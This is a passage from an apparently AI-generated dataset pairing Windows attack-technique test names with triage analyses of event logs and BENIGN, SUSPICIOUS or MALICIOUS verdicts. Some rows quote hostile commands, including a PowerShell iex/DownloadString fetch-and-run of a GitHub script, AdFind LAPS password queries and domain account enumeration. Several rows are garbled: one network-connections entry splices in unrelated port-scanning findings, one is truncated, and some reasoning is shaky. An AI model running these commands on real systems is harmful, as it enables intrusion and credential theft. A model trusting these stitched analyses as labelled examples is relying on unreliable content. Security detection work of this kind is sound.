- Monitor network traffic to identify any unauthorized external communications, especially to the mentioned script host.
- Strengthen access controls and audit logs for any further suspicious administrative activities."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Upon reviewing the provided logs, let's analyze potential indicators of suspicious or malicious activity:

### Security Log:
- **EventID 4616**: Indicates a system time change made by `svchost.exe`. While changes to system time can be suspicious, in this case, it seems to be a regular adjustment as it originated from the `LOCAL SERVICE` account and occurred close in time without significant differences. 

### PowerShell Log:
- **EventID 600**: Multiple launching events for PowerShell with the execution of a script designed to detect virtualization. This script is fairly common for environments that want to determine capabilities within a virtual setup. It doesn’t inherently appear malicious, but running PowerShell scripts could be leveraged in attacks. Without further context or indicators, this activity alone isn't flagged as malicious, but it may warrant a review of script execution policies on this system.

### Application Log:
- **Microsoft-Windows-Security-SPP (EventID 16384)**: Regular log entry regarding the Software Protection Platform Service. No anomalies noted.
- **EdgeUpdate (EventID 0)**: This event indicates the stopping of the Edge Update service, which can be a benign operation as part of updates or reconfiguration.

### System Log:
- **Microsoft-Windows-Kernel-General (EventID 1)**: Reflects normal system operations, including system time changes referencing the `svchost.exe` process. No direct indicators of compromise.

### Sysmon Log:
- **EventID 5 and 1**: 
  - Numerous instances of processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hosname.exe` are seen running. 
  - The execution of `wevtutil.exe` by the `admin_test` user is notable since this utility can be used to clear event logs, which is sometimes done by attackers to cover tracks. However, there are no accompanying logs to suggest this behavior within this snapshot.
  - The logging of numerous Sysmon events with different tools (`hostname.exe`, `whoami.exe`, etc.) doesn't directly show malicious intent, assuming typical administrative or diagnostic commands.

### General Observations:
- Most logged activities seem related to administrative actions or standard service operations.
- The use of PowerShell and sysmon with administrative account `admin_test` might suggest a developer or system administrator probing system properties and logs.

### Assessment:
Considering the logs provided, there are no definitive indicators of compromise or clearly malicious activity. However, the extensive use of PowerShell and system utilities warrants further context into routine operations for this host, particularly focusing on why such utilities were employed and whether there could be unauthorized access using the `admin_test` account.

**Resolution**: SUSPICIOUS - The logs contain activity that appears routine given appropriate permissions and context, but further investigation into PowerShell script usage and detailed review for any anomalies in administrative access or operations is advisable."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"Upon reviewing the provided Windows event logs, I've focused on several aspects to assess potential anomalies and suspicious activities:

1. **Security Log**: 
   - The Security log entries show Event ID 4616, which indicates a change in system time. This event involves `svchost.exe`, a legitimate Windows service host process. However, the time appears to have been set back slightly, which could be an indicator of someone covering their tracks or a system misconfiguration. As this was restricted to a very brief timeframe and involved a system process, further investigation into whether this was a legitimate action is warranted.

2. **PowerShell Log**:
   - The PowerShell logs signaled the execution of a command using a temporary location and involvement with `AdFind.exe` - a utility often used for querying Active Directory data. The specific command line used could imply enumeration of domain computers, targeting attributes such as `ms-Mcs-AdmPwd` (related to LAPS - Local Administrator Password Solution). This activity can be suspicious if it wasn't expected as part of routine administrative tasks or security assessments.
   
3. **System Log**:
   - Changes in system time coincide with the Security log changes and could be related to time synchronization with `time.windows.com`. This generally is not suspicious unless accompanied by unauthorized changes or manipulations.

4. **Application Log**:
   - Event ID 16384 from `Software Protection Platform Service` doesn't reveal suspicious activity without additional context, like anomalies in software licensing behavior or unexpected changes to Software Protection settings.

5. **Sysmon Log**:
   - Frequent use of utilities like `whoami.exe`, `hostname.exe`, `wevtutil.exe`, and `conhost.exe` might be part of routine administration or a batch/script running for reporting purposes. Their frequent execution could suggest either automated scripts or an actor gathering reconnaissance details.
   - The presence of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) and typical system utilities (`TrustedInstaller.exe`, etc.) executing under SYSTEM authority is standard behavior but worth confirming legitimate updates.
   - High integrity levels and access via known system directories don't inherently signal compromise unless these processes are unexpected or unscheduled.

**Assessment Summary**:
- **SUSPICIOUS**: The PowerShell activity involving `AdFind.exe` from a temporary directory is unusual and aligns with tactics used in credential or infrastructure discovery by adversaries. If these tasks were not pre-authorized for systems management or testing purposes, they deserve further scrutiny.
- **Actionable Steps**:
  - Verify the legitimacy and intended use of `AdFind.exe`. Cross-reference with change management records or administrative access logs to affirm authorized use.
  - Investigate the rationale behind the time adjustments to ensure they were not malicious.
  - Review user accounts `admin_test` and related logs for unauthorized access attempts or privilege escalations.
  - Assess network activity and additional logs for lateral movement or data extraction signals.

Proceeding with these steps ensures a comprehensive understanding of whether activities were benign internal processes or part of a potential breach."
View available share drives,"After a thorough review of the provided Windows event logs, I have compiled the following analysis regarding potential indicators of malicious activity:

### Security Log:
- **Event ID 4616**: Indicates changes in system time by the `svchost.exe` process under `LOCAL SERVICE` account. This is generally expected behavior for time synchronization activities. The minor timestamp adjustments are not inherently suspicious.

### System Log:
- **Event ID 19 & 35**: Show standard update and time synchronization activities. Windows Defender received updates, and the system synchronized time with a typical NTP server, `time.windows.com`. Such activities are regular maintenance procedures.
- **Event ID 1 & 24 (Kernel-General)**: Indicates updates or checks of system time and timezone settings, also generally related to system timekeeping.

### Application Log:
- **Edge Update Events**: The start and stop of `edgeupdate` services are typical during application updates. No irregular activities are noted here as it suggests normal update behaviors for Microsoft Edge.

### Sysmon Log:
- **Event ID 1 and 5**: Records several executions of common and legitimate processes (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `net.exe`), all executed by `SERVER002\admin_test`. The command lines indicate legitimate administrative or maintenance tasks. The execution of `cmd.exe` with `net share` could be to check shared resources, a standard admin process.
- **Microsoft Edge Update**: Multiple entries detail update processes for Microsoft Edge. The commands reflect a typical update cycle and match expected behavior for such background processes managed by Microsoft services under `NT AUTHORITY\SYSTEM`.

### Powershell Log:
- No specific PowerShell activity was logged, indicating no usage during the timeframe of the log entries.

### Assessment:
- **Benign Time Changes**: The time changes and synchronization activities, though present, align with routine OS maintenance. They do not exhibit manipulation indicative of a compromise.
- **Admin Commands**: The usage of `wevtutil.exe`, `conhost.exe`, and checking network shares (`cmd.exe /c net share`) are typical maintenance commands by IT administrators.
- **Edge and Defender Updates**: Both Microsoft Edge and Windows Defender show expected update activities without any signs of tampering or unauthorized actions.

### Final Conclusion: BENIGN
The analysis suggests that the activities observed in the logs are standard operations consistent with routine system maintenance and do not provide indicators of malicious activities. No anomalies require further investigation, and no risks are identified.

### Guidance:
- Continue to monitor event logs regularly for any deviations.
- Implement standard alert mechanisms to catch potential misuse of `cmd.exe` or sensitive command-line operations, though current usage is benign.
- Ensure updates for all software components remain current to mitigate potential vulnerabilities. 

No immediate action is needed other than maintaining standard security protocols and log monitoring."
Enumerate Remote Hosts with Netscan,"### Analysis of the Provided Logs

After an extensive review of the provided Windows event logs, several activities appear within the logs. Here is a breakdown of notable findings from each log category:

#### Security Log
- **Event ID 5379**: This event generally indicates a credential validation operation failed. The `ReturnCode` of `3221226021` translates to an error that could mean the security context is invalid, often seen in failed logon attempts.
- **Event ID 4624**: Indicates a successful logon by the SYSTEM account with a logon type of `5`, which signifies a service logon.
- **Event ID 4672**: Shows special privileges assigned to the SYSTEM account, which is standard behavior as SYSTEM is granted administrative privileges by design.

#### Sysmon Log
- **Process Creation Events (Event ID 1)**:
  - **Microsoft Edge Installer Execution**: Represents legitimate software updates occurring (Edge browser update process).
  - **PowerShell Execution**: The command line indicates the execution of a PowerShell script to run `netscan.exe`, a network scanning utility, from `C:\Users\ADMIN_~1\AppData\Local\Temp\`.
  - **Externalfiles\netscan.exe Execution**: This scanning utility is executed via command-line, suggesting network reconnaissance activity. This activity executed in a context and location of `Temp` might be suspicious under certain environments.
- **Process Termination Events (Event ID 5)**: Corresponds to various processes including `wevtutil.exe` and PowerShell, which are commonly used for legitimate administration but also have known misuse cases in the context of hacking.

#### System Log
- Events related to the Windows Update process indicate routine updating of antivirus signatures with no anomalies noted.

#### PowerShell Log
- **Execution Events (Event ID 600)**: Credentials for running `netscan.exe`, align with the Sysmon process creation data. This suggests that the PowerShell activity is coordinating the network scan, which may be indicative of reconnaissance efforts by a threat actor.

#### Application Log
- The log related to the Security Center indicates that Windows Defender is active, which is expected and benign.

### Assessment and Conclusion
The activity surrounding the execution of `netscan.exe` using PowerShell is a point of concern. This behavior involves running a network scanning tool from a temporary directory, which could be part of a malicious activity aiming to map the network for further exploitation. Although some events might be routine for IT administrators, the specific context of running a network scanner imposed with evasive parameters (`/hide`, `/auto`) suggests possible illicit behavior.

### Resolution
**SUSPICIOUS**: Given the presence of network scanning activity in a potentially stealthy manner, it is recommended that this matter be investigated further. Determine the legitimacy of `netscan.exe` execution by confirming its necessity and context from IT administrators. Verify if this utility and command sequence are part of authorized network management practices. Additional monitoring and possibly isolating the machine for further forensic analysis may be warranted to rule out a compromise."
Peripheral Device Discovery via fsutil,"Upon analysis of the provided Windows event logs, the following details stand out that are crucial to determining the nature of the activity observed:

1. **Application Log:**

- If there are additional concerns or unexplained behaviors observed outside these logs, supplementary security audits or enhanced monitoring may be warranted."
Enumerate all accounts via PowerShell (Domain),"After analyzing the provided logs, here is a detailed assessment:

### Analysis

1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` running almost simultaneously.
   - `wevtutil.exe` is commonly used to query event logs, clear logs, or manage log configurations. While it is a legitimate tool, its use can be suspicious if run by accounts not known to regularly perform admin tasks or if it occurs with high frequency.
   - `conhost.exe` is a console window host. Multiple instances are not unusual, but increased frequency or pattern alongside potential malicious behavior warrants attention.
   - Usage of `hostname.exe`, `whoami.exe`, and other utilities, like PowerShell, suggests system reconnaissance activity.

2. **PowerShell Logs**:
   - A PowerShell command was executed: `""powershell.exe"" & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`. This command gathers domain-level user information, local group membership, and all domain users, indicating reconnaissance activities possibly for privilege escalation or lateral movement.

3. **System Logs**:
   - The logs primarily show normal time-setting operations and network time protocol communications, which typically do not indicate malicious behavior.

4. **Security Logs**:
   - Event ID 4799 involves enumeration of the ""Users"" group in the ""Builtin"" domain, also consistent with user reconnaissance activities. The account performing these actions appears to be `admin_test`, who is using PowerShell, possibly to enumerate or modify group memberships.

### Assessment

The logs indicate suspicious behavior, especially around the PowerShell command execution aimed at gathering user and group information. While `wevtutil.exe` and `conhost.exe` can normally run frequently, the concurrent use of PowerShell for domain enumeration strongly suggests potential reconnaissance or preparatory steps for a larger attack.

### Recommendation

- **Resolution**: **SUSPICIOUS**
- Additional Investigation:
  - Determine if the `admin_test` account activities are expected and within normal operational bounds.
  - Check for any other security incidents involving `admin_test` or the use of similar PowerShell scripts.
  - Confirm if wevtutil usage was authorized and part of routine operations by `admin_test`.
- Increase monitoring of the system for any further abnormal activities and potential privilege escalations or lateral movements.
- Consider disabling the account or restricting its usage temporarily while conducting further investigations and ensure comprehensive logging of administrative actions.

The findings indicate the necessity for deeper investigation to confirm if the activity is benign or a prelude to malicious actions."
System Information Discovery with WMIC,"Upon reviewing the provided Sysmon, Application, and Security logs, the following analysis was made:

### Sysmon Log Analysis:

1. **Microsoft Edge Update Process (MicrosoftEdgeUpdate.exe):**
   - This executable is a part of the Microsoft Edge automatic update process. The logs show multiple instances of `MicrosoftEdgeUpdate.exe` running with various command-line arguments, such as `/ping`, `/regserver`, and `/update`. These seem like standard operations for an automatic update service.
   - The process appears to be running under the `NT AUTHORITY\SYSTEM` account with a high integrity level which is typical for software updates needing elevated privileges.
   
3. **Windows Utilities (`whoami.exe`, `conhost.exe`, `wevtutil.exe`):**
   - The `whoami.exe` utility is used to display the logged-on user information, which is a non-suspicious action unless performed in an unusual manner; however, its parent process is `wsmprovhost.exe`, which suggests it was likely executed as part of a standard management task.
   - `conhost.exe` is involved with command-line console processes, frequently observed with operations that require a console window.
   - `wevtutil.exe` is used for event log management, likely part of regular administrative activities. There are multiple instances observed with no suspicious command-line arguments.

4. **Command-Line Usage:**
   - A command executed through `cmd.exe` was using WMI (Windows Management Instrumentation) to gather system information such as CPU details, memory capacity, and BIOS versions. This is often seen during system diagnostics or inventory checks. The logs show a heavy use of WMIC commands, which is indicative of an inventory or profile script but could be suspicious if sourced from unknown or unexpected users.

5. **Process Integrity Levels:**
   - Observed operations were conducted under high and system integrity levels, which are common for administrative tasks and system updates.

### Application Log Analysis:

- **Edge Update Service Stopped:**
  - The application log entry indicates that the Microsoft Edge Update service stopped. This could be a normal operation, such as a graceful shutdown of update services post a successful update installation.

### Security Log:

- The security log provided was empty, meaning there was no unusual authentication or security-related events captured in the provided data segment.

### Conclusion:

From the events covered, there is no definitive indication of malicious activity. The processes initiated appear consistent with routine software updates, inventory or monitoring tasks, and administrative actions typically expected on an actively maintained server.

### Final Assessment:

**Resolution: BENIGN**

The analyzed logs contain regular system activity without any clear signs of compromise or malicious intent. However, if this level of system inspection or data gathering via WMIC is unauthorized, it might warrant a policy review or further auditing on script usage to ensure it's standard practice. Further attention should be given to any alerting or CMDB monitoring rules to avoid unnecessary investigations of routine updates and system tasks."
PowerView ShareFinder,"Based on a thorough analysis of the provided event logs, several points of interest and potential concerns were noted:

1. **PowerShell Activity**:
   - The logs reveal that a PowerShell script was executed (`script.ps1`), located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1`. The script used PowerShell to import a module and invoke a command `Invoke-ShareFinder -CheckShareAccess`. 
   - This activity could be considered suspicious depending on the context. Scripts executed from temporary directories may indicate malicious activity, especially if the directory structure is seemingly obfuscated or manipulated.

2. **Time Changes**:
   - The system log indicates a change in system time. This is an action that can be exploited by an attacker to manipulate timestamps, potentially to cover malicious activities.

3. **User Account Enum Activities**:
   - In the Security log, there are several `4798` events which are associated with enumeration of local user accounts. These events were executed by a SYSTEM-level process (`C:\\Windows\\System32\\taskhostw.exe`). Such enumeration could potentially indicate reconnaissance activity.

4. **Sysmon Entries**:
   - There is a prevalence of processes related to the `MicrosoftEdgeUpdate.exe`, which indicates updates and service operations. The processes were primarily executed by `NT AUTHORITY\\SYSTEM`, which is typical for update processes, so they appear benign on the surface.
   - Notably, there are multiple entries of `wevtutil.exe`, used to manage Windows Event Logs which can be suspicious if used to clear logs, though there is no direct evidence of log clearance in this snapshot.

5. **Network Activity**:
   - No specific network-related logs are available, however, details in the Sysmon logs related to external IP addresses or unusual network connections are lacking.

**Assessment**:
While the majority of activities such as Microsoft Edge updates appear routine, the PowerShell execution from a temporary file path and the enumeration of local user accounts are atypical and warrant further scrutiny.

**Resolution**: **SUSPICIOUS**

**Next Steps**:
1. **Contextual Investigation**: Determine the source of the `script.ps1` execution – was this action initiated by a legitimate task or user? Understand the necessity and origin of the `Invoke-ShareFinder` command.
2. **User Enumeration**: Ascertain the rationale behind the enumeration of user accounts executed by the SYSTEM-level process. Verify if this aligns with any recent administrative tasks.
3. **Log Integrity Review**: Cross-reference timestamps and entries to ensure log integrity. Verify if any entries are missing or altered, particularly around the time of suspicious activities.
4. **Forensic Memory and System Analysis**: Conduct a deeper forensic analysis of the host to uncover any potential in-memory threats or detailed records of process activities not covered in the basic logs.

By performing these actions, it is possible to clarify the nature and intention behind the suspicious entries, ensuring appropriate security measures are either confirmed adequate or require strengthening."
WinPwn - Morerecon,"After a detailed analysis of the provided logs, several indicators point towards potentially malicious activity, which warrant further investigation. Here is a breakdown of the findings:

### 1. **Windows PowerShell Log**
- Multiple event entries show PowerShell executing scripts directly from a GitHub URL: `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
- The pattern of execution is consistent with script-based data exfiltration or remote command execution, often seen in malicious activities.
- The use of `iex(new-object net.webclient).downloadstring()` is a known technique for downloading and executing code directly in memory, which is frequently used in attacks to avoid dropping binary files onto the disk.

### 2. **Security Log**
- The logs show privileged account activity (`admin_test`), including an elevation of privileges with multiple high-level privileges like `SeSecurityPrivilege`, `SeDebugPrivilege`, and `SeTakeOwnershipPrivilege`. This is unusual and indicates possible privilege misuse.
- These activities were conducted under a logon session type `3`, which could be indicative of a network logon, hinting at remote or script-driven operations.

### 3. **Sysmon Log**
- Multiple Sysmon logs recorded new process creations, showing an unusual amount of Edge Update executable activities. Various processes such as `MicrosoftEdgeUpdate.exe` executed with parameters indicating updates or installations. While typically benign, the timing in conjunction with other suspicious activity could suggest manipulation or exploitation.
- Sysmon also logs the execution of PowerShell with a high integrity level and a command that matches the suspicious entry noted in the PowerShell log. This reinforces the suspicion around the PowerShell activity.

### 4. **Application Log**
- The logs indicate normal activity for Windows Defender but mention that services related to Edge Update were stopped. This might be consistent with attempts to manipulate or interfere with software updating processes, though it alone is not conclusive.

### Conclusion and Recommendation
- **Resolution:** **MALICIOUS**
- The combination of suspicious PowerShell activity, compromise of privilege, and utilization of system-level processes for non-standard operations strongly suggests malicious activity.
- **Guidance for Proceeding:**
  - Immediate isolation of the host to prevent further compromise or data exfiltration.
  - Full forensic investigation to trace back any data movement, lateral movement, or compromise to other systems.
  - Review and potentially update security protocols for detecting and handling PowerShell activities, along with privilege escalations.
  - Verify and strengthen security practices around privileged account usage and monitoring.

This assessment recommends immediate and thorough investigative actions to not only remediate the current issue but to also understand its scope and prevent future incidents."
System Network Connections Discovery with PowerShell,"### Detailed Analysis of Logs:

#### Windows PowerShell Logs:

- **Activity Observed:**
  - Execution of PowerShell with command `Get-NetTCPConnection` on `Server002`.
  - Several providers (Registry, Alias, Environment, FileSystem, Function, Variable) starting within PowerShell.

- **Assessment:**
  - `Get-NetTCPConnection` retrieves details about all current TCP connections. While potentially useful for legitimate monitoring or troubleshooting, it might be used in a reconnaissance phase by an attacker to map network connections.
  - The absence of further complex or malicious command-line arguments decreases suspicion somewhat, since `Get-NetTCPConnection` is often used legitimately. 
  - However, frequent execution without apparent cause can be indicative of malicious probing.

#### Sysmon Logs:

- **Activity Observed:**
  - Multiple instances of `wevtutil.exe` and `conhost.exe` started by `SERVER002\admin_test`.
  - Execution of `hostname.exe` and `whoami.exe`.

- **Assessment:**
  - `wevtutil.exe` is typically used for managing event logs. Frequent, unexplained use might hint at an attacker trying to clear or manipulate logs.
  - `hostname.exe` and `whoami.exe` are benign on their own but could be used to gather basic system information by an attacker post-exploitation.
  - The context of execution (user ""SERVER002\admin_test"") and processes doesn’t immediately indicate compromise but suggests privileged activities.

#### Application Logs:

No directly suspicious activity noted in these logs. The presence of general application activity does not stand out as suspicious.

#### System Logs:

- **Activity Observed:**
  - Changes to system time by `svchost.exe`.
  
- **Assessment:**
  - Time change events can be indicative of attempts to manipulate logs or disrupt time-sensitive security mechanisms. However, this can also occur due to legitimate time synchronization processes.

#### Security Logs:

- **Time Sync Observation:**
  - System times adjusted by `svchost.exe`, corroborating similar event in the system log.
  
- **Assessment:**
  - For genuine purposes, time changes should have a logical context, e.g., time zone updates. When anomalous or unsanctioned, could suggest efforts to confuse time-dependent security and logging.

### Overall Assessment:

After reviewing the provided log entries, several behaviors are potentially suspicious—including the repeated invocation of administrative utilities and exploratory PowerShell commands, combined with system time alterations. However, each instance can also occur during legitimate administrative operations.

   - **System Logs** show multiple adjustments to system time:
     - EventID 24 and EventID 1 indicate updates and adjustments to system time, which were invoked by `svchost.exe`. Typically, legitimate services manage time adjustments; however, time manipulation can also be indicative of obfuscation attempts by malicious actors.
   - **Security Logs** log time changes as well (EventID 4616), which specifies alterations linked with `svchost.exe`.

#### 2. **Powershell Activity:**
   - There is a significant PowerShell activity logged:
     - **Sysmon Log** (EventID 1) shows PowerShell executions with a complex (and obfuscated in entry) PowerShell command that involves network scanning:
       ```powershell
       ""powershell.exe"" & {$ipAddr = """"; if ($ipAddr -eq """") { ... }}
       ```
     - This PowerShell script appears to scan local network IP addresses and ports (445 and 3389). This type of activity can be indicative of reconnaissance activity within the network, often a precursor to lateral movement or exploitation.

#### 3. **Process Creation:**
   - **Sysmon Log** shows numerous executions of legitimate system processes by `admin_test`:
     - Processes like `wevtutil.exe` and `conhost.exe` are run repeatedly, which can suggest command-line interface usage.
   - The frequent initiation of `wevtutil.exe` typically used for event log management suggests potential clearing or tampering with event logs which might be conducted to erase tracks of activity.

#### 4. **Privilege Escalation:**
   - **Security Logs** show multiple instances of EventID 4672 indicating accounts with special privileges. The user `admin_test` was granted privileges often associated with administrative or system-level tasks.
   - The presence of SeDebugPrivilege and other high-level privileges without legitimate administrative justification can indicate potential elevation of privileges, possibly exploited by an attacker.

#### 5. **Network Services and Remote Execution:**
   - The **Sysmon and Windows PowerShell Logs** indicate that services, and network configurations could have been altered or utilized remotely.
   - IP connections initiated, particularly targeting potentially sensitive or commonly attacked ports, are particularly suspicious.

  - Ensure logging policies and protections are enforced, and audit logs are collect in a tamper-evident manner.

**Final Resolution:** **SUSPICIOUS**
- The activities within the logs raise multiple red flags that suggest possible malicious intent or at least are out of the ordinary operational behavior warranting further investigation."
Get-WmiObject to Enumerate Domain Controllers,"After conducting a thorough analysis of the provided logs, I have assessed each component for suspicious or anomalous behavior, potential indicators of compromise, and overall activity patterns. Here's the breakdown:

### System Log
- **Time Change Events:** There are multiple Kernel-General Event ID 1 and Security ID 4616 entries showing system time adjustments. While time changes may indicate tampering, analyzing logs across events shows the noteworthy change came from the Windows Time Service (EventID 35) synchronizing with ""time.windows.com."" This aligns with typical behavior of time maintenance.
- **Windows Update Events:** Entries related to Windows Update Client (EventIDs 19, 43, and 44) are updating Microsoft Defender Antivirus. This is a normal update process and appears benign.

### Sysmon Log
- **Process Execution:** No unusual command lines. `conhost.exe`, `wevtutil.exe`, `taskhostw.exe`, `svchost.exe`, and other processes executed under `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`, seemingly legitimate activities.
- **PowerShell Use:** A `powershell.exe` command executed `get-wmiobject` in an LDAP namespace, a common but potentially sensitive activity. The command exits upon failure, suggesting an error-management script. It doesn't outright indicate maliciousness but warrants closer observation.

### Security Log
- **Logon Events:** The `admin_test` account exhibits high privilege activities with privileges such as `SeDebugPrivilege`. While not abnormal on its own, any unexpected activity from this account should be questioned about its intent and use.
- **Failed Credential Retrieval:** Several EventID 5379 hint unsuccessful attempts to retrieve credentials using `MicrosoftAccount` or `WindowsLive`. This is unusual and potentially indicative of applications or configurations mishandling/attempting queries which they shouldn't or are not authorized to do.

### PowerShell Log
- There is a single command sequence involving `get-wmiobject`. PowerShell logs indicate the execution of a legitimate, though sensitive, PowerShell script involving directory services querying.

### Application Log
- **Windows Defender Active:** SecurityCenter reports Windows Defender is active (EventID 15), indicating that the security measures inherently remain enabled.

### Overall Assessment
In summary, while most of the logs represent typical system maintenance activities—such as time synchronization, Windows updates, and usual process executions—some anomalies like failed credential retrieval and sensitive PowerShell commands warrant further scrutiny. 

### Final Resolution: SUSPICIOUS
This conclusion stems primarily from a need to further examine:
- The context around failed Microsoft Account and Windows Live credential retrievals.
- The `admin_test` account activities to verify its operations align with expected administrative behavior.
- Any background on the intended use of PowerShell and whether `get-wmiobject` aligns with organizational routines.

**Recommendation**: Proceed with a focused investigation involving:
1. Validation of the `admin_test` account usage and any related security policies.
2. Examination of systems/applications attempting credential queries and remediation of misconfigurations.
3. Monitoring and documentation for PowerShell usage patterns to ensure compliance with security policies. 

Draw insights from network telemetry, vulnerability assessments, and user contexts to elucidate further any suspicious elements highlighted herein."
Security Software Discovery - Windows Firewall Enumeration,"Upon analyzing the provided Windows event logs, several observations were made across the system, application, Windows PowerShell, security, and Sysmon logs. Here is a detailed analysis:

1. **System Logs**:
   - The logs predominantly show updates and standard configurations, including Windows Defender updates and time change events. The activity related to `svchost.exe` adjusting the time is consistent with normal Windows behavior, possibly due to automatic updates or time sync with Windows time servers (`time.windows.com`).

2. **Application Logs**:
   - The entries are mostly routine, including Windows Defender being active, updates related to Microsoft software, and services starting or stopping. No anomalies or errors indicating misbehavior were observed.

3. **Windows PowerShell Logs**:
   - Multiple PowerShell events indicate the execution of a script to retrieve firewall settings and rules with commands like `Get-NetFirewallProfile`, `Get-NetFirewallSetting`, and `Get-NetFirewallRule`. While these do not inherently indicate malicious activity, they do require further inspection to confirm if they align with expected administrative tasks. Such commands could be part of routine checks by an admin or an automated script.

4. **Security Logs**:
   - The security logs chiefly consist of time changes logged by the `svchost.exe` process executed by the `LOCAL SERVICE` account. These entries do not inherently suggest malicious behavior, as they are in line with system time update operations.

5. **Sysmon Logs**:
   - A notable frequency of legitimate Windows processes being executed (`whoami.exe`, `HOSTNAME.EXE`, `WindowsPowerShell`, among others). There are executions of `MicrosoftEdgeUpdate.exe`, which can be normal if updates were scheduled. Processes like `wevtutil.exe` by `admin_test` and frequent use of PowerShell warrant a further look into the legitimacy of these sessions—while the processes themselves are standard, the context and frequency of their execution could hint at potentially suspicious activity.

**Assessment**:
- **BENIGN**: The majority of log activity depicts standard system processes, updates, and routine checks. 
- **SUSPICIOUS**: While there is no direct evidence of malicious activity, the frequent execution of PowerShell scripts and administrative tools warrants a closer confirmation of the necessity and expected nature of these actions by authorized personnel.

**Resolution**: **SUSPICIOUS**. 

**Guidance**:
- Conduct an investigation to verify the source and intent of the PowerShell commands issued, ensuring they are part of expected administrative procedures.
- Confirm the context and authorization of frequent administrative tool usage.
- Maintain heightened monitoring of similar activities moving forward to catch any unauthorized access or escalation attempts quickly."
Adfind - Enumerate Active Directory OUs,"Upon analysis of the provided logs, here's a detailed assessment:

**Suspicious Activities Identified:**

1. **AdFind Execution:**
   - The Sysmon log entry reveals an unusual execution of `cmd.exe` with a command-line argument pointing to ""AdFind.exe"" - `\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe\"" -f (objectcategory=organizationalUnit)`. AdFind is a legitimate tool that can be used to query Active Directory, but it is often utilized by attackers to gather information about the network environment for reconnaissance purposes. The presence of AdFind in a temporary directory path, executed via a command prompt, without any legitimate justification, can indicate potentially malicious activity.

2. **PowerShell Execution:**
   - There is a Sysmon event indicating the execution of `powershell.exe` under the user `SERVER002\\admin_test`. While the details of the command executed are not provided, PowerShell is commonly used by attackers for executing scripts that can download payloads, collect data, or perform lateral movement. The context of `admin_test` using powershell should be further scrutinized.

3. **Windows Event Utility Activity:**
   - Multiple entries in the Sysmon log show executions of `wevtutil.exe` by `SERVER002\\admin_test`. `wevtutil.exe` can be used to clear event logs, potentially to cover tracks after malicious activities. This could signify that someone with admin rights is trying to manipulate or clean up logs which can be a sign of malicious intent or misuse of administrative privileges.

**Benign Activities Identified:**

1. **Microsoft Edge Update Activities:**
   - Numerous logs pertaining to `MicrosoftEdgeUpdate.exe` processes, including setup and registration executables, indicate routine update processes of Microsoft Edge. These activities are consistent with automatic software update behavior seen in modern operating systems for installed software updates.

**Conclusion and Resolution:**

- **Assessment:** The detected execution of AdFind from a temporary file path, coupled with suspicious PowerShell and event utility activities under an admin-user context, particularly raises concerns. The behavior might signify an initial compromise or investigation attempts post-compromise.
  
- **Final Resolution:** **SUSPICIOUS** – These activities warrant additional investigation, specifically reviewing:
  - The context and justification of the AdFind.exe usage.
  - PowerShell command history for any suspicious or unexpected usage.
  - Verification of administrative actions by `admin_test`, including any history of log tampering or atypical command executions.
  
- **Recommended Actions:**
  - Conduct a thorough review of user `admin_test` activity and authority.
  - Analyze network traffic around the timeframe of these logs to identify external connections that correlate with the suspicious activities.
  - Apply enhanced monitoring on Server002, specifically on usage of PowerShell and command-line utility executions.
  - Validate the file integrity and look for unauthorized files within the temporary directories.

These steps will help in determining the intent and impact of the identified suspicious activities and prevent potential compromise escalation."
Extract Edge Browsing History,"### Detailed Analysis of the Logs

After re-examining the logs provided, several details stand out that warrant a closer look. Here's a systematic breakdown of the findings:

#### Security Log
- **Event 4616:** The logs indicate that the time on the system was updated, which is handled by `svchost.exe`. The event was performed by the local service account, which is expected behavior and does not raise immediate red flags.

#### Application Log
- **Edge Update:** Services related to Microsoft Edge Update have been stopped. While service stop events can indicate normal maintenance or updates, without corresponding start events, this could be unusual depending on the organization's patching policies.

#### System Log
- **Time and System Events:** Changes to the system time and synchronization with `time.windows.com` are standard and expected. These events seem to align with routine system operations.

#### Sysmon Log
- **Console Host (`conhost.exe`) and WhoAmI (`whoami.exe`):** These are legitimate Windows processes. The usage patterns do not indicate malicious use, but frequent invocation alongside other processes like `wevtutil.exe` could signal scripting activity.
  
- **PowerShell Activity for Edge History Extraction:** The command `""powershell.exe & {$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?',$History = Get-Content...""` is potentially suspicious as it extracts URLs from Edge browsing history and writes them to a file. This could suggest reconnaissance or information gathering.

- **Frequent Execution of `wevtutil.exe`:** This utility can be used to query or clear event logs, which might be an attempt to hide tracks. If done frequently without a clear legitimate purpose, it might indicate suspicious activity.

#### Windows PowerShell Log
- **PowerShell Sessions:** The PowerShell logs mirror the script invocation seen in the Sysmon logs, further confirming its execution. This activity’s focus on extracting browser history is unusual for a standard administrative task.

### Assessment

- **Suspicious Activity Detected:** The PowerShell script for extracting Edge browsing history is unusual and suggests possible information gathering or data exfiltration efforts. Combined with frequent executions of system utilities like `whoami.exe` and `wevtutil.exe`, there is enough evidence to consider these activities suspicious.

### Conclusion
- **Resolution: SUSPICIOUS**

The activity observed requires further investigation. It is recommended to:
- **Review User Activity:** Identify whether the user account `SERVER002\admin_test` is linked to legitimate scripted operations or maintenance tasks.
- **Inspect Network Traffic:** Analyze outbound traffic from `Server002` to check for any unauthorized exfiltration of data.
- **Correlate with Other Security Controls:** Check whether these activities triggered alerts in endpoint security solutions, SIEM, or DLP technologies.

Assuming additional context is available or further investigation tools, it’s crucial to verify these findings with complementary methods to establish intent or innocence."
Process Discovery - Get-Process,"### Detailed Analysis of the Logs:

**1. System Time Change Anomalies:**
- There are several log entries indicating time changes. For example, time rollback is seen with events such as changing from an ""OldTime"" of ""19:15:02"" to a ""NewTime"" of ""19:14:34"". This could be indicative of timestamp manipulation, commonly referred to as Timestomping, used by attackers to hide malicious activities.
